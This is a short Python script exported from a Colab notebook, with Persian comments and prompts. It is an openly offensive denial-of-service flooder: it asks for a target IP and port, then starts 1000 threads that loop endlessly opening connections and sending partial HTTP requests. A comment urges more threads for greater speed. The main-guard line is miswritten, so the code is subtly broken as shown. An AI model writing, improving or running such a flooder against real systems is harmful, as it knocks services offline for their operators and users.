# -*- coding: utf-8 -*-
"""test01.ipynb

Automatically generated by Colab.

Original file is located at
    https://colab.research.google.com/drive/1Qo_yHoNUOYKybRyc_Ttz2WDcPREelLeH
"""

import socket
import threading

def dos_attack(target_ip, target_port):
    while True:
        # ایجاد یک اتصال به هدف
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((target_ip, target_port))
            sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            sock.sendto(b"Host: " + target_ip.encode() + b"\r\n\r\n", (target_ip, target_port))
        except socket.error:
            pass
        finally:
            sock.close()

if name == "main":
    target_ip = input("لطفا آدرس IP هدف را وارد کنید: ")
    target_port = int(input("لطفا شماره پورت هدف را وارد کنید: "))

    # تعداد نخ‌ها را مشخص کنید
    threads = []
    number_of_threads = 1000  # تعداد نخ‌ها را برای افزایش سرعت بالا ببرید

    for i in range(number_of_threads):
        t = threading.Thread(target=dos_attack, args=(target_ip, target_port))
        t.daemon = True  # به صورت نخ‌های پس‌زمینه اجرا می‌شود
        threads.append(t)

    # شروع نخ‌ها
    for t in threads:
        t.start()

    # جلوگیری از پایان یافتن اسکریپت
    for t in threads:
        t.join()

